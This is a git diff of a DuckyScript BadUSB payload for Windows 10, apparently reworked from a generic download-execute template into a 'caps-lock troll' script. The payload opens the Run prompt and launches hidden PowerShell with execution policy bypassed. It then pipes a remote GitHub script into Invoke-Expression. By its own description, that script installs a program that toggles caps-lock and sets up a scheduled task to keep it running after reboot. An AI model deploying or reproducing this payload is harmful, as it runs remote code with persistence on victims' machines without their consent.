@@ -1,15 +1,12 @@
-REM Title: Download-Execute from Run Prompt
-REM Author: @beigeworm | https://github.com/beigeworm
-REM Description: Uses the Run Prompt to download a file and run it.
+REM Title: cAps-TroLl-v3
+REM Author: @tobis137 | https://github.com/TobiS137
+REM Description: Downloads an exe file that periodically presses the caps-lock key, aswell as creating a windows task, that reopens this exe file on reboot and after 5 min when closed.
 REM Target: Windows 10
 
 REM *SETUP*
-REM replace FILE_URL_HERE with the url of your file to run.
-
 REM some setup for dukie script.
 DEFAULT_DELAY 100
 
-REM open powershell (remove -W Hidden to show the window).
 GUI r
 DELAY 750
 STRING powershell -w h -NoP -Ep Bypass -C "irm https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-TroLl-v3/cAps-TroLl-v3.ps1 | iex"
